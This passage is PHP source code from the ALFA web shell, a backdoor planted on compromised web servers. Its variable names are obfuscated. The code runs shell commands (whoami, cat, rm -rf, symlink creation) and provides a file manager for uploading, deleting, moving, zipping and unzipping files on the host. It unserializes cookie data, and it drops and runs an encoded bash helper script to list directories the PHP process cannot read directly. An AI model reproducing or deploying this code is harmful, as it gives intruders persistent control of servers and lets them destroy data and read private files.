$qfsqfqhdd303f5630eca273e4e8b7b7a5a602f50[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741][$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d] = $zxmbbootfcd7c3d68f3a011af28550aad9ca44a4[$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d][$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741];
}
}
return $qfsqfqhdd303f5630eca273e4e8b7b7a5a602f50;
}
function _alfa_can_runCommand($aktuwcbj8ddeb2027a8c79b3c46510a6dcef9dda=true,$fngvuqqo0fea6a13c52b4d4725368f24b045ca84=true){
	if(isset($_COOKIE["alfa_canruncmd"])&&$fngvuqqo0fea6a13c52b4d4725368f24b045ca84){
		return true;
	}
	if(strlen(alfaEx("whoami",false,$aktuwcbj8ddeb2027a8c79b3c46510a6dcef9dda))>0){
		$_COOKIE["alfa_canruncmd"] = true;
		return true;
	}
	return false;
}
function _alfa_symlink($nyvfphvm42aefbae01d2dfd981f7da7d823d689e, $rsrmsacs2a304a1348456ccd2234cd71a81bd338){
	$ezlfsluv8cbe5a9cdb39b55ad0bfb5f7ca5ecc2d = function_exists("symlink");
	if($ezlfsluv8cbe5a9cdb39b55ad0bfb5f7ca5ecc2d){
		@symlink($nyvfphvm42aefbae01d2dfd981f7da7d823d689e, $rsrmsacs2a304a1348456ccd2234cd71a81bd338);
	}else{
		alfaEx("ln -s '".addslashes($nyvfphvm42aefbae01d2dfd981f7da7d823d689e)."' '".addslashes($rsrmsacs2a304a1348456ccd2234cd71a81bd338)."'");
	}
}
function _alfa_file_exists($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac,$aktuwcbj8ddeb2027a8c79b3c46510a6dcef9dda=true){
	if(@file_exists($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)){
		return true;
	}else{
		if(strlen(alfaEx("ls -la '".addslashes($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)."'",false,$aktuwcbj8ddeb2027a8c79b3c46510a6dcef9dda))>0){
			return true;
		}
	}
	return false;
}
function _alfa_file($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac,$aktuwcbj8ddeb2027a8c79b3c46510a6dcef9dda=true){
	$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5 = @file($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac);
	if(!$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5){
		if(strlen(alfaEx("id",false,$aktuwcbj8ddeb2027a8c79b3c46510a6dcef9dda))>0){
			$sfmsaibm8d777f385d3dfec8815d20f7496026dc = alfaEx('cat "'.addslashes($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac).'"',false,$aktuwcbj8ddeb2027a8c79b3c46510a6dcef9dda);
			if(strlen($sfmsaibm8d777f385d3dfec8815d20f7496026dc)>0){
				return explode("\n", $sfmsaibm8d777f385d3dfec8815d20f7496026dc);
			}else{
				return false;
			}
		}else{
			return false;
		}
	}else{
		return $vmwhayoqf1f713c9e000f5d3f280adbd124df4f5;
	}
}
function _alfa_is_writable($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac){
	$kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87 = false;
	$kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87 = @is_writable($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac);
	if(!$kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87){
		if(_alfa_can_runCommand()){
			$kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87 = alfaEx('[ -w "'.trim(addslashes($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)).'" ] && echo "yes" || echo "no"');
			if($kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87 == "yes"){
				$kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87 = true;
			}else{
				$kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87 = false;
			}
		}
	}
	return $kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87;
}
function _alfa_is_dir($ofvepnxk736007832d2167baaae763fd3a3f3cf1,$porcbkyw15d61712450a686a7f365adf4fef581f="-d"){
	$kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87 = false;
	$kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87 = @is_dir($ofvepnxk736007832d2167baaae763fd3a3f3cf1);
	if($porcbkyw15d61712450a686a7f365adf4fef581f == "-e"){
		$kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87 = @is_file($ofvepnxk736007832d2167baaae763fd3a3f3cf1);
	}
	if(!$kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87){
		if(_alfa_can_runCommand()){
			$kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87 = alfaEx('[ "'.trim($porcbkyw15d61712450a686a7f365adf4fef581f).'" "'.trim(addslashes($ofvepnxk736007832d2167baaae763fd3a3f3cf1)).'" ] && echo "yes" || echo "no"');
			if($kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87 == "yes"){
				return true;
			}else{
				return false;
			}
		}
	}
	return $kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87;
}
function _alfa_load_ace_options($smfdutmo593616de15330c0fb2d55e55410bf994){
	return '<span>Theme: </span><select class="ace-controler ace-theme-selector" base="'.$smfdutmo593616de15330c0fb2d55e55410bf994.'" onChange="alfaAceChangeSetting(this,\'theme\');"><option value="terminal" selected>terminal</option><option value="ambiance">ambiance</option><option value="chaos">chaos</option><option value="chrome">chrome</option><option value="clouds">clouds</option><option value="clouds_midnight">clouds_midnight</option><option value="cobalt">cobalt</option><option value="crimson_editor">crimson_editor</option><option value="dawn">dawn</option><option value="dracula">dracula</option><option value="dreamweaver">dreamweaver</option><option value="eclipse">eclipse</option><option value="github">github</option><option value="gob">gob</option><option value="gruvbox">gruvbox</option><option value="idle_fingers">idle_fingers</option><option value="iplastic">iplastic</option><option value="katzenmilch">katzenmilch</option><option value="kr_theme">kr_theme</option><option value="kuroir">kuroir</option><option value="merbivore">merbivore</option><option value="merbivore_soft">merbivore_soft</option><option value="mono_industrial">mono_industrial</option><option value="monokai">monokai</option><option value="nord_dark">nord_dark</option><option value="pastel_on_dark">pastel_on_dark</option><option value="solarized_dark">solarized_dark</option><option value="solarized_light">solarized_light</option><option value="sqlserver">sqlserver</option><option value="textmate">textmate</option><option value="tomorrow">tomorrow</option><option value="tomorrow_night">tomorrow_night</option><option value="tomorrow_night_blue">tomorrow_night_blue</option><option value="tomorrow_night_bright">tomorrow_night_bright</option><option value="tomorrow_night_eighties">tomorrow_night_eighties</option><option value="twilight">twilight</option><option value="vibrant_ink">vibrant_ink</option><option value="xcode">xcode</option></select><span>Language: </span><select class="ace-controler" base="'.$smfdutmo593616de15330c0fb2d55e55410bf994.'" onChange="alfaAceChangeSetting(this,\'lang\');"><option value="php">php</option><option value="python">python</option><option value="perl">perl</option><option value="c_cpp">c/c++</option><option value="csharp">c#</option><option value="ruby">ruby</option><option value="html">html</option><option value="javascript">javascript</option><option value="css">css</option><option value="xml">xml</option><option value="sql">sql</option><option value="swift">swift</option><option value="sh">bash</option><option value="lua">lua</option><option value="powershell">powershell</option><option value="jsp">jsp</option><option value="java">java</option><option value="json">json</option><option value="plain_text">plain_text</option></select><span>Soft Wrap: </span><input type="checkbox" name="wrapmode" class="ace-controler" onClick="alfaAceChangeWrapMode(this,\''.$smfdutmo593616de15330c0fb2d55e55410bf994.'\');" checked> | <span>Font Size: </span><button class="ace-controler" style="cursor:pointer;" onclick="alfaAceChangeFontSize(\''.$smfdutmo593616de15330c0fb2d55e55410bf994.'\',\'+\', this);return false;">+</button> | <button style="cursor:pointer;" class="ace-controler" onclick="alfaAceChangeFontSize(\''.$smfdutmo593616de15330c0fb2d55e55410bf994.'\', \'-\', this);return false;">-</button> | ';
}
function alfaFilesMan2(){
	alfahead();
	AlfaNum(8,9,10,7,6,5,4);
	echo '<div style="position:relative;" fm_id="1" id="filesman_holder_1" class="ajaxarea filesman-active-content"><div class="header"></div></div>';
	alfaFooter();
}
function copy_paste($yyphbkaj4a8a08f09d37b73795649038408b5f33,$fwekvgvg03c7c0ace395d80182db07ae2c30f034,$iwxbtdws8277e0910d750195b448797616e091ad){
if(@is_dir($yyphbkaj4a8a08f09d37b73795649038408b5f33.$fwekvgvg03c7c0ace395d80182db07ae2c30f034)){
@mkdir($iwxbtdws8277e0910d750195b448797616e091ad.$fwekvgvg03c7c0ace395d80182db07ae2c30f034);
$cvnwfemf2510c39011c5be704182423e3a695e91 = @opendir($yyphbkaj4a8a08f09d37b73795649038408b5f33.$fwekvgvg03c7c0ace395d80182db07ae2c30f034);
while (($npviloqa8fa14cdd754f91cc6554c9e71929cce7 = @readdir($cvnwfemf2510c39011c5be704182423e3a695e91)) !== false)
if (($npviloqa8fa14cdd754f91cc6554c9e71929cce7 != ".") and ($npviloqa8fa14cdd754f91cc6554c9e71929cce7 != ".."))
copy_paste($yyphbkaj4a8a08f09d37b73795649038408b5f33.$fwekvgvg03c7c0ace395d80182db07ae2c30f034.'/',$npviloqa8fa14cdd754f91cc6554c9e71929cce7, $iwxbtdws8277e0910d750195b448797616e091ad.$fwekvgvg03c7c0ace395d80182db07ae2c30f034.'/');
} elseif(is_file($yyphbkaj4a8a08f09d37b73795649038408b5f33.$fwekvgvg03c7c0ace395d80182db07ae2c30f034))
@copy($yyphbkaj4a8a08f09d37b73795649038408b5f33.$fwekvgvg03c7c0ace395d80182db07ae2c30f034, $iwxbtdws8277e0910d750195b448797616e091ad.$fwekvgvg03c7c0ace395d80182db07ae2c30f034);
}
function alfaFilesMan(){
if(!empty ($_COOKIE['alfa_f']))
$_COOKIE['alfa_f'] = @unserialize($_COOKIE['alfa_f']);
if(!empty($_POST['alfa1'])){
switch($_POST['alfa1']){
case 'uploadFile':
$doruqucfc493d5843b2f13d20361344a206ab0bd = false;
$mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7 = false;
if($GLOBALS['glob_chdir_false']){
	$mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7 = _alfa_can_runCommand(true,true);
	$doruqucfc493d5843b2f13d20361344a206ab0bd = true;
}
if(_alfa_is_writable($GLOBALS['cwd'])){
$blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1 = reArrayFiles($_FILES['f']);
$haezbfwi192876560906d9f9c77d35838bb306ba = array();
foreach($blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1 as $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac){
if($doruqucfc493d5843b2f13d20361344a206ab0bd&&$mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7){
	alfaEx("cat '".addslashes($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac['tmp_name'])."' > '".addslashes($_POST["c"]."/".$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac['name'])."'");
}else{
	if(@move_uploaded_file($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac['tmp_name'],$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac['name'])){
		$eajtptdv617a4046ef07a0d9851942247a994cf9 = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac['name'])):array("name" => "????");
		$ylzdpqhrd692bc40d83423d24d3a37582f58468c = function_exists("posix_getgrgid")&&function_exists("filegroup")?@posix_getgrgid(@filegroup($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac['name'])):array("name" => "????");
		$dkaogabh4ec4bcc7102266cf3de98ec5693b356a = $eajtptdv617a4046ef07a0d9851942247a994cf9['name']?$eajtptdv617a4046ef07a0d9851942247a994cf9['name']:(function_exists("fileowner")?@fileowner($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac['name']):"????");
		$rpagoyoaffa309cd16f9906446e409e8e1fca46c = $ylzdpqhrd692bc40d83423d24d3a37582f58468c['name']?$ylzdpqhrd692bc40d83423d24d3a37582f58468c['name']:(function_exists("filegroup")?@filegroup($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac['name']):"????");
		$kaetjeum0accdd691149b8182212528c8ed7330c = @date('Y-m-d H:i:s', @filemtime($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac['name']));
		$jldneloy4ac335b84cbc6e1bce3868e38065f567 = alfaPermsColor($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac['name']);
		$noybsmul234ef73792399c22704f8aef10b14541 = @filesize($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac['name']);
		$haezbfwi192876560906d9f9c77d35838bb306ba[] = array("name" => $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac['name'], "size" => alfaSize($noybsmul234ef73792399c22704f8aef10b14541), "perm" => $jldneloy4ac335b84cbc6e1bce3868e38065f567, "modify" => $kaetjeum0accdd691149b8182212528c8ed7330c, "owner" => $dkaogabh4ec4bcc7102266cf3de98ec5693b356a."/".$rpagoyoaffa309cd16f9906446e409e8e1fca46c);
	}
}
}
if(!$doruqucfc493d5843b2f13d20361344a206ab0bd){
	echo json_encode($haezbfwi192876560906d9f9c77d35838bb306ba);
}
}else{
	echo "noperm";
	return;
}
if(!$doruqucfc493d5843b2f13d20361344a206ab0bd){
return;
}
break;
case 'mkdir':
$ypqojtbob5fafbfc3d2662e3532f51a4d115cbcf = false;
if($GLOBALS['glob_chdir_false']){
	if(_alfa_can_runCommand(true,true)){
		if(_alfa_is_writable($GLOBALS['cwd'])){
			if(!_alfa_is_dir(trim($_POST['alfa2']))){
				alfaEx("cd '".trim(addslashes($_POST['c']))."';mkdir '".trim(addslashes($_POST['alfa2']))."'");
				echo "<script>alfaShowNotification('".addslashes($_POST['alfa2'])." created...', 'Files manager');</script>";
			}else{
				echo "<script>alfaShowNotification('folder already existed', 'Files manager', 'error');</script>";
			}
		}else{
			echo "<script>alfaShowNotification('folder isnt writable !', 'Files manager', 'error');</script>";
		}
	}else{
		echo "<script>alfaShowNotification('Can\'t create new dir !', 'Files manager', 'error');</script>";
	}
}else{
	if(_alfa_is_writable($GLOBALS['cwd'])){
		if(!_alfa_is_dir(trim($_POST['alfa2']))){
			if(!@mkdir(trim($_POST['alfa2']))){
				echo "<script>alfaShowNotification('Can\'t create new dir !', 'Files manager', 'error');</script>";
			}else{
				echo "<script>alfaShowNotification('".addslashes($_POST['alfa2'])." created...', 'Files manager');</script>";
			}
		}else{
			echo "<script>alfaShowNotification('folder already existed', 'Files manager', 'error');</script>";}
	}else{
		echo "<script>alfaShowNotification('folder isnt writable !', 'Files manager', 'error');</script>";
	}
}
break;
case 'delete':
function deleteDir($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485){
$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = (substr($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485,-1)=='/') ? $jwzcflrpd6fe1d0be6347b8ef2427fa629c04485:$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485.'/';
$qwysgjpm700f6fa0edb608ee5cc3cfa63f1c94cc = @opendir($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485);
while(($geklwdir447b7147e84be512208dcc0995d67ebc = @readdir($qwysgjpm700f6fa0edb608ee5cc3cfa63f1c94cc)) !== false){
$geklwdir447b7147e84be512208dcc0995d67ebc = $jwzcflrpd6fe1d0be6347b8ef2427fa629c04485.$geklwdir447b7147e84be512208dcc0995d67ebc;
if((basename($geklwdir447b7147e84be512208dcc0995d67ebc) == "..") || (basename($geklwdir447b7147e84be512208dcc0995d67ebc) == "."))
continue;
$hcgexxko599dcce2998a6b40b1e38e8c6006cb0a = @filetype($geklwdir447b7147e84be512208dcc0995d67ebc);
if ($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "dir")
deleteDir($geklwdir447b7147e84be512208dcc0995d67ebc);
else
@unlink($geklwdir447b7147e84be512208dcc0995d67ebc);
}
@closedir($qwysgjpm700f6fa0edb608ee5cc3cfa63f1c94cc);
@rmdir($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485);
}
if(is_array(@$_POST['f']))
foreach($_POST['f'] as $npviloqa8fa14cdd754f91cc6554c9e71929cce7){
if($npviloqa8fa14cdd754f91cc6554c9e71929cce7 == '..')
continue;
$npviloqa8fa14cdd754f91cc6554c9e71929cce7 = rawurldecode($npviloqa8fa14cdd754f91cc6554c9e71929cce7);
if($GLOBALS["glob_chdir_false"]){
	if(_alfa_can_runCommand(true,true)){
		alfaEx("rm -rf '".addslashes($_POST['c'].'/'.$npviloqa8fa14cdd754f91cc6554c9e71929cce7)."'");
	}
}else{
alfaEx("rm -rf '".addslashes($npviloqa8fa14cdd754f91cc6554c9e71929cce7)."'",false,false);
if(@is_dir($npviloqa8fa14cdd754f91cc6554c9e71929cce7))
deleteDir($npviloqa8fa14cdd754f91cc6554c9e71929cce7);
else
@unlink($npviloqa8fa14cdd754f91cc6554c9e71929cce7);
}
}
if(@is_dir(rawurldecode(@$_POST['alfa2']))&&rawurldecode(@$_POST['alfa2'])!='..'){
deleteDir(rawurldecode(@$_POST['alfa2']));
alfaEx("rm -rf '".addslashes($_POST['alfa2'])."'",false,false);
}else{
@unlink(rawurldecode(@$_POST['alfa2']));
}
if($GLOBALS["glob_chdir_false"]){
	$kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb = rawurldecode(@$_POST['alfa2']);
	if($kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb!='..'&&!empty($kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb)){
		if(_alfa_can_runCommand(true,true)){
			alfaEx("cd '".trim(addslashes($_POST['c']))."';rm -rf '".addslashes($kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb)."'");
		}
	}
}
if(is_array($_POST['f']))
return;
break;
case 'paste':
if($_COOKIE['alfa_act'] == 'copy'&&isset($_COOKIE['alfa_f'])){
foreach($_COOKIE['alfa_f'] as $npviloqa8fa14cdd754f91cc6554c9e71929cce7)
copy_paste($_COOKIE['alfa_c'],$npviloqa8fa14cdd754f91cc6554c9e71929cce7, $GLOBALS['cwd']);
}elseif($_COOKIE['alfa_act'] == 'move'&&isset($_COOKIE['alfa_f'])){
function move_paste($yyphbkaj4a8a08f09d37b73795649038408b5f33,$fwekvgvg03c7c0ace395d80182db07ae2c30f034,$iwxbtdws8277e0910d750195b448797616e091ad){
if(@is_dir($yyphbkaj4a8a08f09d37b73795649038408b5f33.$fwekvgvg03c7c0ace395d80182db07ae2c30f034)){
@mkdir($iwxbtdws8277e0910d750195b448797616e091ad.$fwekvgvg03c7c0ace395d80182db07ae2c30f034);
$cvnwfemf2510c39011c5be704182423e3a695e91 = @opendir($yyphbkaj4a8a08f09d37b73795649038408b5f33.$fwekvgvg03c7c0ace395d80182db07ae2c30f034);
while (($npviloqa8fa14cdd754f91cc6554c9e71929cce7 = @readdir($cvnwfemf2510c39011c5be704182423e3a695e91)) !== false)
if(($npviloqa8fa14cdd754f91cc6554c9e71929cce7 != ".") and ($npviloqa8fa14cdd754f91cc6554c9e71929cce7 != ".."))
copy_paste($yyphbkaj4a8a08f09d37b73795649038408b5f33.$fwekvgvg03c7c0ace395d80182db07ae2c30f034.'/',$npviloqa8fa14cdd754f91cc6554c9e71929cce7, $iwxbtdws8277e0910d750195b448797616e091ad.$fwekvgvg03c7c0ace395d80182db07ae2c30f034.'/');
}elseif(@is_file($yyphbkaj4a8a08f09d37b73795649038408b5f33.$fwekvgvg03c7c0ace395d80182db07ae2c30f034))
@copy($yyphbkaj4a8a08f09d37b73795649038408b5f33.$fwekvgvg03c7c0ace395d80182db07ae2c30f034, $iwxbtdws8277e0910d750195b448797616e091ad.$fwekvgvg03c7c0ace395d80182db07ae2c30f034);
}
foreach($_COOKIE['alfa_f'] as $npviloqa8fa14cdd754f91cc6554c9e71929cce7)
@rename($_COOKIE['alfa_c'].$npviloqa8fa14cdd754f91cc6554c9e71929cce7, $GLOBALS['cwd'].$npviloqa8fa14cdd754f91cc6554c9e71929cce7);
}elseif($_COOKIE['alfa_act'] == 'zip'&&isset($_COOKIE['alfa_f'])){
if(class_exists('ZipArchive')){
$zessjrwjadcdbd79a8d84175c229b192aadc02f2 = new ZipArchive();
$trmxvosf5edbecc938805e5bd1ec6d39e3733bd5 = "alfa_".rand(1,1000).".zip";
if($zessjrwjadcdbd79a8d84175c229b192aadc02f2->open($trmxvosf5edbecc938805e5bd1ec6d39e3733bd5, 1)){
@chdir($_COOKIE['alfa_c']);
foreach($_COOKIE['alfa_f'] as $npviloqa8fa14cdd754f91cc6554c9e71929cce7){
if($npviloqa8fa14cdd754f91cc6554c9e71929cce7 == '..')continue;
if(@is_file($_COOKIE['alfa_c'].$npviloqa8fa14cdd754f91cc6554c9e71929cce7))
$zessjrwjadcdbd79a8d84175c229b192aadc02f2->addFile($_COOKIE['alfa_c'].$npviloqa8fa14cdd754f91cc6554c9e71929cce7, $npviloqa8fa14cdd754f91cc6554c9e71929cce7);
elseif(@is_dir($_COOKIE['alfa_c'].$npviloqa8fa14cdd754f91cc6554c9e71929cce7)){
$zeqhfpyq420cec00303cf5ff3ee30bf824fc1427 = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($npviloqa8fa14cdd754f91cc6554c9e71929cce7.'/'));
foreach($zeqhfpyq420cec00303cf5ff3ee30bf824fc1427 as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d=>$rkptsoeg2063c1608d6e0baf80249c42e2be5804){
$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d = str_replace('\\','/',realpath($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d));
if(@is_dir($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d)){
if(in_array(substr($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d, strrpos($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d,'/')+1),array('.', '..')))continue;
}else{$zessjrwjadcdbd79a8d84175c229b192aadc02f2->addFile($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d,$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d);}}}}
@chdir($GLOBALS['cwd']);
$zessjrwjadcdbd79a8d84175c229b192aadc02f2->close();
__alert('>> '.$trmxvosf5edbecc938805e5bd1ec6d39e3733bd5.' << is created...');}}
}elseif($_COOKIE['alfa_act'] == 'unzip'&&isset($_COOKIE['alfa_f'])){
if(class_exists('ZipArchive')){
$zessjrwjadcdbd79a8d84175c229b192aadc02f2 = new ZipArchive();
foreach($_COOKIE['alfa_f'] as $npviloqa8fa14cdd754f91cc6554c9e71929cce7) {
if($zessjrwjadcdbd79a8d84175c229b192aadc02f2->open($_COOKIE['alfa_c'].$npviloqa8fa14cdd754f91cc6554c9e71929cce7)){
$zessjrwjadcdbd79a8d84175c229b192aadc02f2->extractTo($_COOKIE['alfa_cwd']);
$zessjrwjadcdbd79a8d84175c229b192aadc02f2->close();}}}}
unset($_COOKIE['alfa_f']);
break;
default:
if(!empty($_POST['alfa1'])){
if(in_array($_POST['alfa1'], array("copy", "move", "zip", "unzip"))){
__alfa_set_cookie('alfa_act', @$_POST['alfa1']);
__alfa_set_cookie('alfa_f', @serialize($_POST['f']));
__alfa_set_cookie('alfa_c', @$_POST['c']);
return;
}
}
break;
}
}
$ynxombge846b365452129ca6fc37251d7cc56b2d = @scandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
if(preg_match("#(.*)\/\.\.#", $_POST['c'], $ybaqpbzt9b207167e5381c47682c6b4f58a623fb)){
	$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = explode('/', $ybaqpbzt9b207167e5381c47682c6b4f58a623fb[1]);
	array_pop($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485);
	$_POST['c'] = implode('/', $jwzcflrpd6fe1d0be6347b8ef2427fa629c04485);
}
$dninrxalb3c2a4e4e995e2bb566ea05a15ae7efb = false;
if($ynxombge846b365452129ca6fc37251d7cc56b2d === false){
	if(_alfa_can_runCommand(true,true)){
		$haiclsffee9a367452a770ec5b0860f6a0e4ebe6 = @$_COOKIE["alfachdir_bash_path"];
		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
		if(!isset($_COOKIE["alfachdir_bash"])||@!file_exists($haiclsffee9a367452a770ec5b0860f6a0e4ebe6."/alfacgiapi/getdir.alfa")){
			$ozurlglxd574d4bb40c84861791a694a999cce69 = "jZTfb5swEMef4a+4uaYkSmmS/YpEwsOkqVNfO+1hSqKKggnWwI4MEaFppL3vv9xfUtsYSKpMWh6I7/O9O9vcHVfvxrtCjJ8oGxep/fX+IcBT+/7ue4DdFXNtEqUc0BLZCRdAgTLAg6wALwQsfYdziLkN8rcNyzRAio0xRRrRBJZLwBSCANDtLYLra/D2Mr5KaZSCIGGcUfZrCOv1HMqUMB3VJcOD1gO8BLBiw86DBhpoO6G2RVnCZURRhiV4ESDnznd++M433yl856c/cULf+YLaLJa6n+u7+gzgCXWdUIiwhsViAQirbMi2ynpLAnzQynKyPurdeMWI6OjU0I3gu21H30tqFfS5j/6gSM5jmtQd+2hit0TkbJd3/NMJT3d5yDrls1EYqR571XWb1yALNBgApcFkLp8LfLjqfI6KjEYw7Av2JstIFu/QWT6m1J8e//7+05Qy5oy8PdNZuKxAU21zGV3zyXQ2m6G+vJbVXhVNlGJAkw/FQm5X7eVDVPKxF5V00LXVmb1KFkaVTyVUraSYOGFnm0Q84yJAeUjZ40YQwvRRZUKSmXT/FSo7tSR9aEEu+AgStx79abHqHf0SYipIVHJRn22kW0tpJ0fqYwTZ7LJQyM7OiL7uy8tlB5Jvy/rfbkWdP/GMRqCm6ML+OrA5tp7zwwqxMCcr5MNKTsEK3ch/5WpIs1RQT4GhZq2wHgODzVphNQqGNksFm2kwuDWUYJrEKJ3VSrpdTkRjt7IuzYls7OONrZu4+Z4djmv0Cg==";
			$haiclsffee9a367452a770ec5b0860f6a0e4ebe6 = alfaWriteTocgiapi("getdir.alfa",$ozurlglxd574d4bb40c84861791a694a999cce69);
			__alfa_set_cookie("alfachdir_bash", "true");
			__alfa_set_cookie("alfachdir_bash_path", $haiclsffee9a367452a770ec5b0860f6a0e4ebe6);
		}
		$ynxombge846b365452129ca6fc37251d7cc56b2d = alfaEx("cd ".$haiclsffee9a367452a770ec5b0860f6a0e4ebe6."/alfacgiapi;sh getdir.alfa '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
		$ynxombge846b365452129ca6fc37251d7cc56b2d = json_decode($ynxombge846b365452129ca6fc37251d7cc56b2d, true);
		if(is_array($ynxombge846b365452129ca6fc37251d7cc56b2d)){
			array_pop($ynxombge846b365452129ca6fc37251d7cc56b2d);
			$dninrxalb3c2a4e4e995e2bb566ea05a15ae7efb = true;
		}else{
			$ynxombge846b365452129ca6fc37251d7cc56b2d = false;
		}
	}
}
alfahead();
AlfaNum(8,9,10,7,6,5,4);
$kzsohgsx96f38927089025fcb666749c4ed3e17e = @count($ynxombge846b365452129ca6fc37251d7cc56b2d);
if($kzsohgsx96f38927089025fcb666749c4ed3e17e > 300){
	@$_COOKIE["alfa_limited_files"] = 100;
}
$qbrcjtzpaba9d9c6e7530725b536d7fac6802f42 = isset($_COOKIE["alfa_sort_by"]) ? $_COOKIE["alfa_sort_by"] : 'name';
$fhkqimnk979c39a7da56e11aec8d019f1141f3bf = isset($_COOKIE["alfa_limited_files"]) ? (int)$_COOKIE["alfa_limited_files"] : 0;
$nbtopthif15df019c7cdad335361676ccccdd613 = isset($_POST["pagenum"]) ? (int)$_POST["pagenum"] : 1;
$qstyvvzn3d0b9980dfe3d47546d26a3c3da72a13 = isset($_COOKIE["alfa_filesman_direction"]) ? $_COOKIE["alfa_filesman_direction"] : 'asc';
$pdkblcta21e255669741286e16ca36a2c67482f6 = 1;
if($fhkqimnk979c39a7da56e11aec8d019f1141f3bf > 0){
	$pdkblcta21e255669741286e16ca36a2c67482f6 = ceil($kzsohgsx96f38927089025fcb666749c4ed3e17e/$fhkqimnk979c39a7da56e11aec8d019f1141f3bf);
	if($pdkblcta21e255669741286e16ca36a2c67482f6 > 1){
		$pdkblcta21e255669741286e16ca36a2c67482f6++;
	}
}
echo '<div><div class="filters-holder"><span>Filter: </span><input style="color:#25ff00;" autocomplete="off" type="text" id="regex-filter" name="name-filter" onkeydown="doFilterName(this);"><span style="margin-left:10px">Sort By: </span><select name="sort_files" onchange="sortBySelectedValue(this,\'alfa_sort_by\');" style="color:#25ff00;"><option value="name" '.($qbrcjtzpaba9d9c6e7530725b536d7fac6802f42 == 'name'?'selected':'').'>Name</option><option value="size" '.($qbrcjtzpaba9d9c6e7530725b536d7fac6802f42 == 'size'?'selected':'').'>Size</option><option value="modify" '.($qbrcjtzpaba9d9c6e7530725b536d7fac6802f42 == 'modify'?'selected':'').'>Modify</option></select><span style="margin-left:10px">Direction: </span><select name="direction_filesman" onChange="sortBySelectedValue(this,\'alfa_filesman_direction\')" style="color:#25ff00;"><option value="asc" '.($qstyvvzn3d0b9980dfe3d47546d26a3c3da72a13 == 'asc'?'selected':'').'>Ascending</option><option value="desc" '.($qstyvvzn3d0b9980dfe3d47546d26a3c3da72a13 == 'desc'?'selected':'').'>Descending</option></select><span style="margin-left:10px;"> limit: </span><input style="text-align:center;width: 40px;color:#25ff00;" type="text" name="limited_number" value="'.$fhkqimnk979c39a7da56e11aec8d019f1141f3bf.'" oninput="this.value=this.value.replace(/[^0-9]/g,\'\');setCookie(\'alfa_limited_files\', this.value, 2012);"><span style="margin-left:10px;">Files Count: <b style="color:#25ff00;">'.($kzsohgsx96f38927089025fcb666749c4ed3e17e-1).'</b></span></div><div class="header">';
if($ynxombge846b365452129ca6fc37251d7cc56b2d == false){
